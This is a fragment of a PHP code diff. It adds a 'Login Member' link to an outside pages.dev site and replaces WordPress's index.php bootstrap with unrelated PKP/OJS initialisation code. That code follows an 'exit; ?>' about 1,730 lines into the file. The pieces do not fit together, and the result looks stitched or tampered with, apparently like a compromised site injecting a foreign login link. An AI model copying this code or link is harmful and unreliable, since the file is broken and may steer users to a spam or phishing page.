+             href="https://mrjedu.pages.dev/"
              target="_blank" rel="noopener">
             Login Member
           </a>
@@ -1730,18 +1731,41 @@ exit;
 ?>
 
 /**
- * Front to the WordPress application. This file doesn't do anything, but loads
- * wp-blog-header.php which does and tells WordPress to load the theme.
- *
- * @package WordPress
+ * @defgroup index Index
+ * Bootstrap and initialization code.
  */
 
 /**
- * Tells WordPress to load the WordPress theme and output it.
+ * @file includes/bootstrap.inc.php
  *
- * @var bool
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2000-2021 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * @ingroup index
+ *
+ * @brief Core system initialization code.
+ * This file is loaded before any others.
+ * Any system-wide imports or initialization code should be placed here.
  */
-define( 'WP_USE_THEMES', true );
 
-/** Loads the WordPress Environment and Template */
-require __DIR__ . '/wp-blog-header.php';
+
+/**
+ * Basic initialization (pre-classloading).
+ */
+
+define('ENV_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? ';' : ':');
+if (!defined('DIRECTORY_SEPARATOR')) {
+	// Older versions of PHP do not define this
+	define('DIRECTORY_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? '\\' : '/');
+}
+define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
+chdir(BASE_SYS_DIR);
+
+// System-wide functions
+require('./lib/pkp/includes/functions.inc.php');
+
+// Initialize the application environment
+import('classes.core.Application');
+
+return new Application();
